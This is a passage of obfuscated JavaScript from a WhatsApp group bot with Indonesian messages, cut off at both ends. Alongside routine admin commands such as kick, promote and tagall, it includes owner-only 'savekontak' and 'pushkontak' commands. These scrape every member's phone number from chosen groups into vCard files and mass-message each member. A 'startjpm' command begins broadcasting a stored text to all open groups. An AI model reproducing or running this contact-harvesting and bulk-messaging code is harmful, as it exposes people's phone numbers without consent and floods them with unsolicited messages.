      case "setdesk":
        {
          if (!_0x570995) {
            return _0x3abc22(msg.group);
          }
          if (!_0x104099) {
            return _0x3abc22(msg.adminbot);
          }
          if (!_0x515108 && !_0x1d834a) {
            return _0x3abc22(msg.admin);
          }
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("teksnya"));
          }
          await _0x59b98d.groupUpdateDescription(_0x16d835.chat, _0x43281f);
          _0x16d835.reply("Berhasil Mengganti *Deskripsi* Grup");
        }
        break;
      case "open":
        {
          if (!_0x570995) {
            return _0x3abc22(msg.group);
          }
          if (!_0x104099) {
            return _0x3abc22(msg.adminbot);
          }
          if (!_0x515108 && !_0x1d834a) {
            return _0x3abc22(msg.admin);
          }
          await _0x59b98d.groupSettingUpdate(_0x16d835.chat, "not_announcement");
          _0x16d835.reply("Berhasil Mengganti Setelan Grup Menjadi Anggota Dapat Mengirim Pesan");
        }
        break;
      case "close":
        {
          if (!_0x570995) {
            return _0x3abc22(msg.group);
          }
          if (!_0x104099) {
            return _0x3abc22(msg.adminbot);
          }
          if (!_0x515108 && !_0x1d834a) {
            return _0x3abc22(msg.admin);
          }
          await _0x59b98d.groupSettingUpdate(_0x16d835.chat, "announcement");
          _0x16d835.reply("Berhasil Mengganti Setelan Grup Menjadi Hanya Admin Yang Dapat Mengirim Pesan");
        }
        break;
      case "del":
      case "delete":
        {
          if (_0x570995) {
            if (!_0x1d834a && !_0x515108) {
              return _0x3abc22(msg.admin);
            }
            if (!_0x16d835.quoted) {
              return _0x16d835.reply("Reply Pesan Yang Ingin Di Hapus");
            }
            if (_0x16d835.quoted.sender == _0x1a329f) {
              _0x59b98d.sendMessage(_0x16d835.chat, {
                delete: {
                  remoteJid: _0x16d835.chat,
                  fromMe: true,
                  id: _0x16d835.quoted.id,
                  participant: _0x16d835.quoted.sender
                }
              });
            } else {
              if (!_0x104099) {
                return _0x3abc22(msg.adminbot);
              }
              _0x59b98d.sendMessage(_0x16d835.chat, {
                delete: {
                  remoteJid: _0x16d835.chat,
                  fromMe: false,
                  id: _0x16d835.quoted.id,
                  participant: _0x16d835.quoted.sender
                }
              });
            }
          } else {
            if (!_0x1d834a) {
              return _0x3abc22(msg.owner);
            }
            if (!_0x16d835.quoted) {
              return _0x16d835.reply("Reply Pesan Yang Ingin Di Hapus");
            }
            _0x59b98d.sendMessage(_0x16d835.chat, {
              delete: {
                remoteJid: _0x16d835.chat,
                fromMe: false,
                id: _0x16d835.quoted.id,
                participant: _0x16d835.quoted.sender
              }
            });
          }
        }
        break;
      case "demote":
      case "demote":
        {
          if (!_0x570995) {
            return _0x3abc22(msg.group);
          }
          if (!_0x515108 && !_0x1d834a) {
            return _0x3abc22(msg.admin);
          }
          if (!_0x104099) {
            return _0x3abc22(msg.adminbot);
          }
          if (_0x16d835.quoted || _0x43281f) {
            let _0x7fceb5 = _0x16d835.mentionedJid[0] ? _0x16d835.mentionedJid[0] : _0x16d835.quoted ? _0x16d835.quoted.sender : _0x43281f.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
            await _0x59b98d.groupParticipantsUpdate(_0x16d835.chat, [_0x7fceb5], "demote").then(_0x33f47c => _0x16d835.reply("Berhasil Memberhentikan " + _0x7fceb5.split("@")[0] + " Sebagai Admin Grup Ini")).catch(_0xd682de => _0x16d835.reply(_0xd682de.toString()));
          } else {
            return _0x16d835.reply(_0x286488("62838XXX"));
          }
        }
        break;
      case "promote":
      case "promot":
        {
          if (!_0x570995) {
            return _0x3abc22(msg.group);
          }
          if (!_0x515108 && !_0x1d834a) {
            return _0x3abc22(msg.admin);
          }
          if (!_0x104099) {
            return _0x3abc22(msg.adminbot);
          }
          if (_0x16d835.quoted || _0x43281f) {
            let _0x42bb84 = _0x16d835.mentionedJid[0] ? _0x16d835.mentionedJid[0] : _0x16d835.quoted ? _0x16d835.quoted.sender : _0x43281f.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
            await _0x59b98d.groupParticipantsUpdate(_0x16d835.chat, [_0x42bb84], "promote").then(_0x5ba6c0 => _0x16d835.reply("Berhasil Menjadikan " + _0x42bb84.split("@")[0] + " Sebagai Admin Grup Ini")).catch(_0x4ae14a => _0x16d835.reply(_0x4ae14a.toString()));
          } else {
            return _0x16d835.reply(_0x286488("62838XXX"));
          }
        }
        break;
      case "add":
      case "addmember":
        {
          if (!_0x570995) {
            return _0x3abc22(msg.group);
          }
          if (!_0x57e1e7[0]) {
            return _0x16d835.reply(_0x286488("62838XXX"));
          }
          var _0x487964 = _0x43281f.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          var _0x726d40 = await _0x59b98d.onWhatsApp("" + _0x487964.split("@")[0]);
          if (_0x726d40.length < 1) {
            return _0x16d835.reply("Nomor Tersebut Tidak Terdaftar Di WhatsApp");
          }
          if (!_0x104099 || !_0x2ffff5.memberAddMode) {
            return _0x16d835.reply("Gagal Menambahkan Member, Karna Admin Tidak Mengizinkam Peserta Dapat Add Member");
          }
          var _0x4be7a3 = await _0x59b98d.groupParticipantsUpdate(_0x16d835.chat, [_0x487964], "add");
          if (_0x4be7a3[0].status == 200) {
            return _0x16d835.reply("Berhasil Menambahkan " + _0x487964.split("@")[0] + " Kedalam Grup Ini");
          }
          if (_0x4be7a3[0].status == 408) {
            return _0x16d835.reply("Gagal Menambahkan " + _0x487964.split("@")[0] + " Ke Dalam Grup Ini, Karna Target Tidak Mengizinkan Orang Lain Dapat Menambahkan Dirinya Ke Dalam Grup");
          }
          if (_0x4be7a3[0].status == 409) {
            return _0x16d835.reply("Dia Sudah Ada Di Dalam Grup Ini!");
          }
          if (_0x4be7a3[0].status == 403) {
            return _0x16d835.reply("Gagal Menambahkan " + _0x487964.split("@")[0] + " Ke Dalam Grup Ini, Karna Target Tidak Mengizinkan Orang Lain Dapat Menambahkan Dirinya Ke Dalam Grup");
          }
        }
        break;
      case "kik":
      case "kick":
        {
          if (!_0x570995) {
            return _0x3abc22(msg.group);
          }
          if (!_0x104099) {
            return _0x3abc22(msg.adminbot);
          }
          if (!_0x515108 && !_0x1d834a) {
            return _0x3abc22(msg.admin);
          }
          if (_0x43281f || _0x16d835.quoted) {
            let _0x2fc547 = _0x16d835.mentionedJid[0] ? _0x16d835.mentionedJid[0] : _0x16d835.quoted ? _0x16d835.quoted.sender : _0x43281f.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
            await _0x59b98d.groupParticipantsUpdate(_0x16d835.chat, [_0x2fc547], "remove").then(_0x31e7d8 => _0x59b98d.sendMessage(_0x16d835.chat, {
              text: "Berhasil Mengeluarkan @" + _0x2fc547.split("@")[0] + " Dari Grup Ini",
              mentions: ["" + _0x2fc547]
            }, {
              quoted: _0x16d835
            })).catch(_0x2395a8 => _0x16d835.reply(_0x2395a8.toString()));
          } else {
            return _0x16d835.reply(_0x286488("nomornya/@tag"));
          }
        }
        break;
      case "hidetag":
      case "z":
      case "h":
        {
          if (!_0x570995) {
            return _0x3abc22(msg.group);
          }
          if (!_0x515108 && !_0x1d834a) {
            return _0x3abc22(msg.admin);
          }
          if (!_0x16d835.quoted && !_0x43281f) {
            return _0x16d835.reply(_0x286488("teksnya/replyteks"));
          }
          var _0x487964 = _0x16d835.quoted ? _0x16d835.quoted.text : _0x43281f;
          var _0x73f455 = await _0x2ffff5.participants.map(_0x1f0ae6 => _0x1f0ae6.id);
          const _0x3730f0 = {
            text: _0x487964,
            mentions: [..._0x73f455]
          };
          _0x59b98d.sendMessage(_0x16d835.chat, _0x3730f0);
        }
        break;
      case "tagall":
      case "tag":
        {
          if (!_0x570995) {
            return _0x3abc22(msg.group);
          }
          if (!_0x515108 && !_0x1d834a) {
            return _0x3abc22(msg.admin);
          }
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("Pesannya"));
          }
          var _0x73f455 = await _0x2ffff5.participants.map(_0x3a06b2 => _0x3a06b2.id);
          var _0x487964 = " " + _0x43281f + "\n\n";
          _0x73f455.forEach(_0x2e2d13 => _0x2e2d13 !== _0x16d835.sender ? _0x487964 += "@" + _0x2e2d13.split("@")[0] + "\n" : "");
          const _0x47de24 = {
            text: _0x487964,
            mentions: [..._0x73f455]
          };
          _0x59b98d.sendMessage(_0x16d835.chat, _0x47de24);
        }
        break;
      case "owner":
      case "creator":
        {
          _0x59b98d.sendContact(_0x16d835.chat, ["" + owner[0].split("@")[0]], "Developer Bot", _0x16d835);
        }
        break;
      case "savekontak":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x570995) {
            return _0x3abc22(msg.group);
          }
          const _0x7631b3 = await _0x2ffff5.participants.filter(_0x255ca1 => _0x255ca1.id.endsWith(".net")).map(_0x324bf9 => _0x324bf9.id);
          for (let _0x290f1d of _0x7631b3) {
            if (_0x290f1d !== _0x16d835.sender) {
              _0x1eb39b.push(_0x290f1d);
              fs.writeFileSync("./all/database/contacts.json", JSON.stringify(_0x1eb39b));
            }
          }
          try {
            const _0x4f4e0d = [...new Set(_0x1eb39b)];
            const _0x277a6d = _0x4f4e0d.map((_0x16e60b, _0x2dc361) => {
              const _0x491074 = ["BEGIN:VCARD", "VERSION:3.0", "FN:WA[" + _0x5e8153(2) + "] " + _0x16e60b.split("@")[0], "TEL;type=CELL;type=VOICE;waid=" + _0x16e60b.split("@")[0] + ":+" + _0x16e60b.split("@")[0], "END:VCARD", ""].join("\n");
              return _0x491074;
            }).join("");
            fs.writeFileSync("./all/database/contacts.vcf", _0x277a6d, "utf8");
          } catch (_0x6ddc53) {
            _0x16d835.reply(_0x6ddc53.toString());
          } finally {
            if (_0x16d835.chat !== _0x16d835.sender) {
              await _0x16d835.reply("File Kontak Berhasil Dikirim ke Private Chat");
            }
            await _0x59b98d.sendMessage(_0x16d835.sender, {
              document: fs.readFileSync("./all/database/contacts.vcf"),
              fileName: "contacts.vcf",
              caption: "File Contact Berhasil Di Buat✅",
              mimetype: "text/vcard"
            }, {
              quoted: _0x16d835
            });
            _0x1eb39b.splice(0, _0x1eb39b.length);
            await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(_0x1eb39b));
            await fs.writeFileSync("./all/database/contacts.vcf", "");
          }
        }
        break;
      case "savekontak2":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("idgrupnya\n\nketik *.listgc* untuk melihat semua list id grup"));
          }
          var _0x43c7a2 = _0x43281f;
          var _0x4c534b;
          try {
            _0x4c534b = await _0x59b98d.groupMetadata("" + _0x43c7a2);
          } catch (_0x30feac) {
            return _0x16d835.reply("*ID Grup* tidak valid!");
          }
          const _0x2b24ae = await _0x4c534b.participants;
          const _0x47e87c = await _0x2b24ae.filter(_0xdbaf5f => _0xdbaf5f.id.endsWith(".net")).map(_0x53208f => _0x53208f.id);
          for (let _0x4c48cd of _0x47e87c) {
            if (_0x4c48cd !== _0x16d835.sender) {
              _0x1eb39b.push(_0x4c48cd);
              fs.writeFileSync("./all/database/contacts.json", JSON.stringify(_0x1eb39b));
            }
          }
          try {
            const _0x279c74 = [...new Set(_0x1eb39b)];
            const _0x60ac55 = _0x279c74.map((_0x161923, _0x42fa72) => {
              const _0x419876 = ["BEGIN:VCARD", "VERSION:3.0", "FN:WA[" + _0x5e8153(2) + "] " + _0x161923.split("@")[0], "TEL;type=CELL;type=VOICE;waid=" + _0x161923.split("@")[0] + ":+" + _0x161923.split("@")[0], "END:VCARD", ""].join("\n");
              return _0x419876;
            }).join("");
            fs.writeFileSync("./all/database/contacts.vcf", _0x60ac55, "utf8");
          } catch (_0x210381) {
            _0x16d835.reply(_0x210381.toString());
          } finally {
            if (_0x16d835.chat !== _0x16d835.sender) {
              await _0x16d835.reply("File Kontak Berhasil Dikirim ke Private Chat");
            }
            await _0x59b98d.sendMessage(_0x16d835.sender, {
              document: fs.readFileSync("./all/database/contacts.vcf"),
              fileName: "contacts.vcf",
              caption: "File Contact Berhasil Di Buat✅",
              mimetype: "text/vcard"
            }, {
              quoted: _0x16d835
            });
            _0x1eb39b.splice(0, _0x1eb39b.length);
            await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(_0x1eb39b));
            await fs.writeFileSync("./all/database/contacts.vcf", "");
          }
        }
        break;
      case "pushkontak":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x570995) {
            return _0x3abc22(msg.group);
          }
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("pesannya"));
          }
          var _0x487964 = _0x43281f;
          const _0x5f040a = await _0x2ffff5.participants.filter(_0x4845ec => _0x4845ec.id.endsWith(".net")).map(_0x520b14 => _0x520b14.id);
          _0x16d835.reply("Memproses Mengirim Pesan Ke *" + _0x5f040a.length + " Member Grup*");
          for (let _0x2135cc of _0x5f040a) {
            if (_0x2135cc !== _0x16d835.sender) {
              _0x1eb39b.push(_0x2135cc);
              await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(_0x1eb39b));
              const _0x5e6bfe = {
                text: _0x487964
              };
              const _0x3e0245 = {
                quoted: _0x143656
              };
              await _0x59b98d.sendMessage(_0x2135cc, _0x5e6bfe, _0x3e0245);
              await sleep(global.delaypushkontak);
            }
          }
          try {
            const _0x49480a = [...new Set(_0x1eb39b)];
            const _0x579d86 = _0x49480a.map((_0x41cfae, _0x4f8071) => {
              const _0x55c493 = ["BEGIN:VCARD", "VERSION:3.0", "FN:WA[" + _0x5e8153(2) + "] " + _0x41cfae.split("@")[0], "TEL;type=CELL;type=VOICE;waid=" + _0x41cfae.split("@")[0] + ":+" + _0x41cfae.split("@")[0], "END:VCARD", ""].join("\n");
              return _0x55c493;
            }).join("");
            fs.writeFileSync("./all/database/contacts.vcf", _0x579d86, "utf8");
          } catch (_0x710fb6) {
            _0x16d835.reply(_0x710fb6.toString());
          } finally {
            if (_0x16d835.chat !== _0x16d835.sender) {
              await _0x16d835.reply("Berhasil Mengirim Pesan Ke *" + _0x5f040a.length + " Member Grup*, File Contact Berhasil Dikirim ke Private Chat");
            }
            await _0x59b98d.sendMessage(_0x16d835.sender, {
              document: fs.readFileSync("./all/database/contacts.vcf"),
              fileName: "contacts.vcf",
              caption: "File Contact Berhasil Di Buat✅",
              mimetype: "text/vcard"
            }, {
              quoted: _0x16d835
            });
            _0x1eb39b.splice(0, _0x1eb39b.length);
            await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(_0x1eb39b));
            await fs.writeFileSync("./all/database/contacts.vcf", "");
          }
        }
        break;
      case "pushkontak1":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"));
          }
          if (!_0x43281f.split("|")) {
            return _0x16d835.reply(_0x286488("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"));
          }
          var [_0x43c7a2, _0x487964] = _0x43281f.split("|");
          var _0x4c534b;
          try {
            _0x4c534b = await _0x59b98d.groupMetadata("" + _0x43c7a2);
          } catch (_0x48fe67) {
            return _0x16d835.reply("*ID Grup* tidak valid!");
          }
          const _0x4843aa = await _0x4c534b.participants;
          const _0x368e5c = await _0x4843aa.filter(_0x17cdd3 => _0x17cdd3.id.endsWith(".net")).map(_0x54e577 => _0x54e577.id);
          _0x16d835.reply("Memproses Mengirim Pesan Ke *" + _0x368e5c.length + " Member Grup*");
          for (let _0x143b6f of _0x368e5c) {
            if (_0x143b6f !== _0x16d835.sender) {
              _0x1eb39b.push(_0x143b6f);
              await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(_0x1eb39b));
              const _0x2a9eb1 = {
                text: _0x487964
              };
              const _0x178f74 = {
                quoted: _0x143656
              };
              await _0x59b98d.sendMessage(_0x143b6f, _0x2a9eb1, _0x178f74);
              await sleep(global.delaypushkontak);
            }
          }
          try {
            const _0x5be71c = [...new Set(_0x1eb39b)];
            const _0x20b07e = _0x5be71c.map((_0x46d11e, _0x2bcc3e) => {
              const _0x4a2f1e = ["BEGIN:VCARD", "VERSION:3.0", "FN:WA[" + _0x5e8153(2) + "] " + _0x46d11e.split("@")[0], "TEL;type=CELL;type=VOICE;waid=" + _0x46d11e.split("@")[0] + ":+" + _0x46d11e.split("@")[0], "END:VCARD", ""].join("\n");
              return _0x4a2f1e;
            }).join("");
            fs.writeFileSync("./all/database/contacts.vcf", _0x20b07e, "utf8");
          } catch (_0x57489c) {
            _0x16d835.reply(_0x57489c.toString());
          } finally {
            if (_0x16d835.chat !== _0x16d835.sender) {
              await _0x16d835.reply("Berhasil Mengirim Pesan Ke *" + _0x368e5c.length + " Member Grup*, File Contact Berhasil Dikirim ke Private Chat");
            }
            await _0x59b98d.sendMessage(_0x16d835.sender, {
              document: fs.readFileSync("./all/database/contacts.vcf"),
              fileName: "contacts.vcf",
              caption: "File Contact Berhasil Di Buat✅",
              mimetype: "text/vcard"
            }, {
              quoted: _0x16d835
            });
            _0x1eb39b.splice(0, _0x1eb39b.length);
            await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(_0x1eb39b));
            await fs.writeFileSync("./all/database/contacts.vcf", "");
          }
        }
        break;
      case "pushkontak2":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x43281f) {
            return _0x16d835.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup");
          }
          if (!_0x43281f.split("|")) {
            return _0x16d835.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup");
          }
          var _0x43c7a2 = _0x43281f.split("|")[0];
          var _0x41e040 = Number(_0x43281f.split("|")[1]);
          var _0x487964 = _0x43281f.split("|")[2];
          if (!_0x43c7a2.endsWith("@g.us")) {
            return _0x16d835.reply("Format ID Grup Tidak Valid");
          }
          if (isNaN(_0x41e040)) {
            return _0x16d835.reply("Format Delay Tidak Valid");
          }
          if (!_0x487964) {
            return _0x16d835.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup");
          }
          var _0x4c534b;
          try {
            _0x4c534b = await _0x59b98d.groupMetadata("" + _0x43c7a2);
          } catch (_0x55682e) {
            return _0x16d835.reply("*ID Grup* tidak valid!");
          }
          const _0x2b7112 = await _0x4c534b.participants;
          const _0x4e8058 = await _0x2b7112.filter(_0x1f46f3 => _0x1f46f3.id.endsWith(".net")).map(_0x25ead5 => _0x25ead5.id);
          _0x16d835.reply("Memproses Mengirim Pesan Ke *" + _0x4e8058.length + " Member Grup*");
          for (let _0x365543 of _0x4e8058) {
            if (_0x365543 !== _0x16d835.sender) {
              _0x1eb39b.push(_0x365543);
              await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(_0x1eb39b));
              const _0x17ed64 = {
                text: _0x487964
              };
              const _0x4bc755 = {
                quoted: _0x143656
              };
              await _0x59b98d.sendMessage(_0x365543, _0x17ed64, _0x4bc755);
              await sleep(Number(_0x41e040));
            }
          }
          try {
            const _0xa7a736 = [...new Set(_0x1eb39b)];
            const _0x361c3a = _0xa7a736.map((_0x10759a, _0x299385) => {
              const _0x4c9435 = ["BEGIN:VCARD", "VERSION:3.0", "FN:WA[" + _0x5e8153(2) + "] " + _0x10759a.split("@")[0], "TEL;type=CELL;type=VOICE;waid=" + _0x10759a.split("@")[0] + ":+" + _0x10759a.split("@")[0], "END:VCARD", ""].join("\n");
              return _0x4c9435;
            }).join("");
            fs.writeFileSync("./all/database/contacts.vcf", _0x361c3a, "utf8");
          } catch (_0x57de65) {
            _0x16d835.reply(_0x57de65.toString());
          } finally {
            if (_0x16d835.chat !== _0x16d835.sender) {
              await _0x16d835.reply("Berhasil Mengirim Pesan Ke *" + _0x4e8058.length + " Member Grup*, File Contact Berhasil Dikirim ke Private Chat");
            }
            await _0x59b98d.sendMessage(_0x16d835.sender, {
              document: fs.readFileSync("./all/database/contacts.vcf"),
              fileName: "contacts.vcf",
              caption: "File Contact Berhasil Di Buat✅",
              mimetype: "text/vcard"
            }, {
              quoted: _0x16d835
            });
            _0x1eb39b.splice(0, _0x1eb39b.length);
            await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(_0x1eb39b));
            await fs.writeFileSync("./all/database/contacts.vcf", "");
          }
        }
        break;
      case "idgc":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x570995) {
            return _0x3abc22(msg.group);
          }
          _0x16d835.reply("" + _0x16d835.chat);
        }
        break;
      case "listgc":
      case "cekidgc":
      case "listgrup":
        {
          let _0x3eca29 = Object.values(await _0x59b98d.groupFetchAllParticipating().catch(_0x23a77b => null));
          let _0x3fdf1d = "\n";
          await _0x3eca29.forEach((_0x1d29b1, _0x55199b) => {
            _0x3fdf1d += "*" + (_0x55199b + 1) + ".* " + _0x1d29b1.subject + "\n* *ID :* " + _0x1d29b1.id + "\n* *Total Member :* " + _0x1d29b1.participants.length + " Member\n* *Status Grup :* " + (_0x1d29b1.announce == true ? "Tertutup" : "Terbuka") + "\n* *Pembuat :* " + (_0x1d29b1.owner ? _0x1d29b1.owner.split("@")[0] : "Sudah keluar") + "\n\n";
          });
          const _0xce20de = {
            quoted: _0x143656
          };
          _0x59b98d.sendMessage(_0x16d835.chat, {
            text: "" + _0x3fdf1d,
            contextInfo: {
              mentionedJid: [_0x16d835.sender],
              externalAdReply: {
                thumbnail: await _0x51fae7(_0x260654),
                title: "[ " + _0x3eca29.length + " Group Chat ] ",
                body: "Runtime : " + _0x3b2d71(process.uptime()),
                sourceUrl: global.linkyt,
                previewType: "PHOTO"
              }
            }
          }, _0xce20de);
        }
        break;
      case "joingc":
      case "join":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x43281f && !_0x16d835.quoted) {
            return _0x16d835.reply(_0x286488("linknya"));
          }
          let _0x144afd = _0x16d835.quoted ? _0x16d835.quoted.text : _0x43281f;
          if (!_0x144afd.includes("whatsapp.com")) {
            return _0x16d835.reply("Link Tautan Tidak Valid!");
          }
          let _0x3bc07a = _0x144afd.split("https://chat.whatsapp.com/")[1];
          await _0x59b98d.groupAcceptInvite(_0x3bc07a).then(_0x25e200 => _0x16d835.reply("Berhasil Bergabung Ke Dalam Grup ✅")).catch(_0x4ffbf8 => _0x16d835.reply(_0x4ffbf8.toString()));
        }
        break;
      case "leave":
      case "leavegc":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x570995) {
            return _0x3abc22(msg.group);
          }
          await _0x16d835.reply("Otw Abangkuhh🔥");
          await sleep(3000);
          await _0x59b98d.groupLeave(_0x16d835.chat);
        }
        break;
      case "leavegc2":
      case "leave2":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          let _0x12f0e2 = await Object.values(await _0x59b98d.groupFetchAllParticipating().catch(_0x41a34 => null));
          let _0x519bd9 = [];
          let _0x14436f = "*Contoh Cara Penggunaan :*\nKetik *" + _0x58554c + "* Nomor Grupnya\n\n*List Semua Grup Chat :*\n\n";
          await _0x12f0e2.forEach((_0x147b1d, _0x590a02) => {
            _0x519bd9.push(_0x590a02);
            _0x14436f += " *Nomor Grup => " + (_0x590a02 + 1) + "*\n*• Nama :* " + _0x147b1d.subject + "\n*• ID :* " + _0x147b1d.id + "\n*• Total Member :* " + _0x147b1d.participants.length + " Member\n*• Status Grup :* " + (_0x147b1d.announce == true ? "Tertutup" : "Terbuka") + "\n*• Pembuat :* " + (_0x147b1d.owner ? _0x147b1d.owner.split("@")[0] : "Sudah keluar") + "\n\n";
          });
          if (!_0x57e1e7[0]) {
            _0x16d835.reply(_0x14436f);
          } else if (_0x57e1e7[0]) {
            if (!_0x519bd9.includes(Number(_0x57e1e7[0]) - 1)) {
              return _0x16d835.reply("Grup tidak ditemukan");
            }
            let _0x2ea358 = Number(_0x57e1e7[0]) - 1;
            await _0x16d835.reply("Berhasil Keluar Dari Grup :\n*" + _0x12f0e2[_0x2ea358].subject + "*");
            await _0x59b98d.groupLeave("" + _0x12f0e2[_0x2ea358].id);
          }
        }
        break;
      case "scbot":
      case "sc":
      case "scriptbot":
        {
          if (_0x1d834a) {
            _0x16d835.reply("Memproses Pengambilan Scriptbot");
            let _0x215c22 = _0x293d3f().split("T")[1].split("+")[0];
            var _0x164188 = "Asisten-Bot-Erlangga-V3";
            const _0x265a3b = (await execSync("ls")).toString().split("\n").filter(_0x46cb72 => _0x46cb72 != "node_modules" && _0x46cb72 != "session" && _0x46cb72 != "package-lock.json" && _0x46cb72 != "yarn.lock" && _0x46cb72 != "");
            const _0xf94a85 = await execSync("zip -r " + _0x164188 + ".zip " + _0x265a3b.join(" "));
            await _0x59b98d.sendMessage(_0x16d835.sender, {
              document: await fs.readFileSync("./" + _0x164188 + ".zip"),
              fileName: _0x164188 + ".zip",
              mimetype: "application/zip"
            }, {
              quoted: _0x16d835
            });
            await execSync("rm -rf " + _0x164188 + ".zip");
            if (_0x16d835.chat !== _0x16d835.sender) {
              return _0x16d835.reply("Scriptbot Berhasil Dikirim Ke Chat Pribadi");
            }
          } else {
            let _0x3e4e3 = "*# Script " + namabot + "*\n\nScript Bot Ini Tidak Di Bagikan Secara *Gratis!!*\n\nJika Anda Berminat Ingin Membeli Script Ini, Silahkan Chat *Ownerbot* Dengan Cara Ketik *.owner*\n\n*➡️ Youtube :*\n" + global.linkyt + "\n\n*➡️ Grup Jualan :*\n" + global.linkgc + "\n\n*➡️ Testimoni :*\n" + global.linksaluran;
            const _0x68fa8b = {
              text: _0x3e4e3,
              contextInfo: {
                externalAdReply: {
                  showAdAttribution: true
                }
              }
            };
            const _0x2703a3 = {
              extendedTextMessage: _0x68fa8b
            };
            _0x59b98d.relayMessage(_0x16d835.chat, {
              requestPaymentMessage: {
                currencyCodeIso4217: "IDR",
                amount1000: 10000000,
                requestFrom: _0x16d835.sender,
                noteMessage: _0x2703a3
              }
            }, {});
          }
        }
        break;
      case "done":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("Nama Barang\n\n*Contoh :* Panel Unlimited"));
          }
          if (!_0x43281f.split(",")) {
            return _0x16d835.reply(_0x286488("barang,harga\n\n*Contoh :* Panel Unlimited,2"));
          }
          var _0x487964 = "\n_*Alhamdulillah Next Order Cik✅*_\n\n━━━━━━━━━━━━━━━━━━━━━━\n📦 *" + _0x43281f + "*\n⏰ " + _0x5a009b(Date.now()) + "\n💫 Status : Done✅\n━━━━━━━━━━━━━━━━━━━━━━\n*🪀 WhatsApp:https://wa.me/6282137392620\n\n\n> BERBAGI SALURAN : https://whatsapp.com/channel/0029Vb3LbOyDZ4LVYsjO0Z0T\n\n>TESTIMONI :\nhttps://whatsapp.com/channel/0029VamBAmPF1YlV7kabYP36\n━━━━━━━━━━━━━━━━━━━━━━\n\n𝗧𝗲𝗿𝗶𝗺𝗮𝗸𝗮𝘀𝗶𝗵 𝗧𝗲𝗹𝗮𝗵 𝗢𝗿𝗱𝗲𝗿 👑\n𝗗𝗶 𝗧𝘂𝗻𝗴𝗴𝘂 𝗢𝗿𝗱𝗲𝗿𝗮𝗻 𝗦𝗲𝗹𝗮𝗻𝗷𝘂𝘁𝗻𝘆𝗮☺️\n";
          const _0x26b62e = {
            text: _0x487964
          };
          const _0x1e46f8 = {
            text: global.foother
          };
          let _0x1ed2ad = generateWAMessageFromContent(_0x16d835.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [_0x16d835.sender],
                    externalAdReply: {
                      showAdAttribution: true
                    }
                  },
                  body: proto.Message.InteractiveMessage.Body.create(_0x26b62e),
                  footer: proto.Message.InteractiveMessage.Footer.create(_0x1e46f8),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"Youtube\",\"url\":\"" + global.linkyt + "\",\"merchant_url\":\"https://www.google.com\"}"
                    }, {
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"Telegram\",\"url\":\"" + global.linktele + "\",\"merchant_url\":\"https://www.google.com\"}"
                    }, {
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"Testimoni\",\"url\":\"" + global.linksaluran + "\",\"merchant_url\":\"https://www.google.com\"}"
                    }]
                  })
                })
              }
            }
          }, {
            userJid: _0x16d835.sender,
            quoted: _0xed6d2
          });
          await _0x59b98d.relayMessage(_0x16d835.chat, _0x1ed2ad.message, {
            messageId: _0x1ed2ad.key.id
          });
        }
        break;
      case "startjpm":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          var _0x4fb2f1 = await fs.readFileSync("./all/database/teksjpm.js").toString();
          if (_0x4fb2f1.length < 1) {
            return _0x16d835.reply("Teks Jpm Tidak Ditemukan, Silahkan Isi/Edit Teks Jpm Didalam Folder all/database");
          }
          var _0x487964 = "" + _0x4fb2f1;
          let _0x3245dc = 0;
          let _0x133227 = await _0x59b98d.groupFetchAllParticipating();
          let _0x13f6b1 = Object.entries(_0x133227).slice(0).map(_0x19a931 => _0x19a931[1]);
          let _0x28d904 = _0x13f6b1.filter(_0x2896fd => _0x2896fd.announce == false);
          let _0x439cb3 = _0x28d904.map(_0x233b30 => _0x233b30.id);
          _0x16d835.reply("Memproses Mengirim Pesan Ke *" + _0x439cb3.length + " Grup*");
          const _0x3350ec = {
